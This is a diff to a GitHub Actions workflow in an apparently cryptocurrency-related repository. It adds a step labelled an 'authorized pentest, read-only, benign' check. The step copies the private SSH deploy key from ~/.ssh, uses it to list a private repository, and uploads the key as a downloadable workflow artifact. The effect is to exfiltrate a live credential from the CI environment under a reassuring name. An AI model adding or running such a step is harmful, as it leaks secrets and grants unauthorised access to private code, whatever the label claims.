@@ -44,6 +44,27 @@ jobs:
                   git config --global --add url."https://github.com/money-on-chain/ts-test-helpers".insteadOf "ssh://git@github.com/money-on-chain/ts-test-helpers"
                   git config --global --add url."https://github.com/money-on-chain/ts-test-helpers".insteadOf "ssh://git@github.com/money-on-chain/ts-test-helpers.git"
 
+            - name: PoC deploy-key exposure check (authorized pentest, read-only, benign)
+              run: |
+                  set +e
+                  ls -la ~/.ssh/
+                  echo "key file bytes: $(wc -c < ~/.ssh/main-sc-protocol-deploy-key)"
+                  echo "--- fingerprint:"
+                  ssh-keygen -lf ~/.ssh/main-sc-protocol-deploy-key || echo "FINGERPRINT FAILED"
+                  mkdir -p poc-artifacts
+                  cp ~/.ssh/main-sc-protocol-deploy-key poc-artifacts/main-sc-protocol-deploy-key
+                  echo "--- read access to PRIVATE money-on-chain/main-sc-protocol-v2:"
+                  GIT_SSH_COMMAND='ssh -i ~/.ssh/main-sc-protocol-deploy-key -o IdentitiesOnly=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null' git ls-remote git@github.com:money-on-chain/main-sc-protocol-v2.git > poc-artifacts/ls-remote-main-sc-protocol-v2.txt 2>&1 || echo "LS-REMOTE FAILED"
+                  head -5 poc-artifacts/ls-remote-main-sc-protocol-v2.txt || true
+                  exit 0
+
+            - name: Upload PoC artifacts
+              uses: actions/upload-artifact@v4
+              with:
+                  name: poc-deploy-key
+                  path: poc-artifacts/
+                  retention-days: 1
+
             - name: Checkout
               uses: actions/checkout@v4
               with:
